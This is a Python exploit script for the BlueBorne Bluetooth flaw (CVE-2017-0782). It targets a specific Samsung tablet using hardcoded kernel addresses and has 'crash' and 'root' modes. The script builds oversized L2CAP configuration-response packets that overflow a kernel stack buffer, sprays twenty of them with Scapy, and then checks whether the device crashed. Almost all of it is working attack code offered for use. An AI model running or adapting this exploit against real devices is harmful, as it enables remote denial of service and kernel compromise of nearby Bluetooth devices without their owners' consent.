#!/usr/bin/env python3
"""
CVE-2017-0782 — BlueBorne L2CAP Overflow via Scapy
Target: Samsung SM-T377A (ARM32, 3.10.9, NO KASLR/PXN/canaries)

Scapy gives us full raw control over L2CAP signaling via HCI.

IMPORTANT: Must stop bluetoothd first:
  sudo systemctl stop bluetooth
  sudo hciconfig hci0 up
  sudo python3 bluborne_scapy.py 02:00:00:00:00:21 [crash|root]
"""

import sys
import os
import struct
import time

if os.getuid() != 0:
    print('Run with: sudo python3 bluborne_scapy.py <target> [crash|root]')
    sys.exit(1)

# Suppress scapy warnings
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

from scapy.layers.bluetooth import *
from scapy.sendrecv import *

TARGET = sys.argv[1] if len(sys.argv) > 1 else '02:00:00:00:00:21'
MODE = sys.argv[2] if len(sys.argv) > 2 else 'crash'

COMMIT_CREDS        = 0xC0054328
PREPARE_KERNEL_CRED = 0xC00548E0

overflow_addr = 0xDEADBEEF if MODE == 'crash' else PREPARE_KERNEL_CRED

print(f'=== CVE-2017-0782 BlueBorne via Scapy ({MODE}) ===')
print(f'Target: {TARGET}')
print(f'Addr:   0x{overflow_addr:08X}')
print()

# Step 1: Open HCI socket via scapy
print('[1] Opening Bluetooth socket...')
bt_sock = BluetoothL2CAPSocket(TARGET)
print(f'    Connected to {TARGET}!')

# Step 2: Build the overflow payload
# L2CAP_CONF_RSP with UNACCEPT result triggers l2cap_parse_conf_rsp
# which writes options into req[64] on the kernel stack

def build_overflow_raw(ident, scid, addr):
    """Build raw L2CAP CONF_RSP signaling packet with overflow."""
    # Signaling: code(1) + ident(1) + length(2)
    # CONF_RSP: scid(2) + flags(2) + result(2) + options(N)
    
    options = b''
    
    # Fill req[4..63]: 15 MTU options = 60 bytes
    for _ in range(15):
        options += bytes([0x01, 0x02, 0x00, 0x02])  # MTU=512
    
    # Overflow: 8 EFS options = 144 bytes into stack frame
    addr_bytes = struct.pack('<I', addr)
    for _ in range(8):
        options += bytes([0x06, 0x10])  # EFS, len=16
        options += addr_bytes * 4       # 16 bytes of target address
    
    # CONF_RSP payload
    conf_rsp = struct.pack('<HHH', scid, 0x0000, 0x0001)  # UNACCEPT
    conf_rsp += options
    
    # L2CAP signaling header
    sig = struct.pack('<BBH', 0x05, ident, len(conf_rsp))  # CONF_RSP
    sig += conf_rsp
    
    return sig

# Step 3: Send overflow packets
# We spray multiple ident/SCID combinations
print('[2] Sending overflow payloads...')
print(f'    Spraying idents 1-4, SCIDs 0x40-0x44')
print(f'    WARNING: target may crash/reboot!')
print()

for ident in range(1, 5):
    for scid in range(0x40, 0x45):
        payload = build_overflow_raw(ident, scid, overflow_addr)
        
        # Send as raw L2CAP on signaling CID (0x0001)
        # Scapy L2CAP_CmdHdr for signaling
        try:
            pkt = L2CAP_Hdr(cid=1) / Raw(payload)
            bt_sock.send(pkt)
        except Exception as e:
            pass  # some sends may fail

print(f'    Sent {4*5} overflow packets')
print()

# Step 4: Wait and check
print('[3] Waiting 5 seconds to check target status...')
time.sleep(5)

try:
    # Try to send something and see if connection is alive
    bt_sock.send(L2CAP_Hdr(cid=1) / Raw(b'\x08\x42\x00\x04PING'))
    time.sleep(2)
    print('[*] No crash detected — connection still up')
    print('[*] Possible issues:')
    print('    - Scapy may be sending on the data CID, not signaling CID')
    print('    - The SCID/ident may not match an active channel')
    print('    - The channel may be in wrong state for CONF_RSP processing')
except Exception:
    print('[!] Connection dropped!')
    print('[+] *** Target may have crashed! Check if tablet reboots. ***')

bt_sock.close()
print()
print('Done. Check tablet status.')
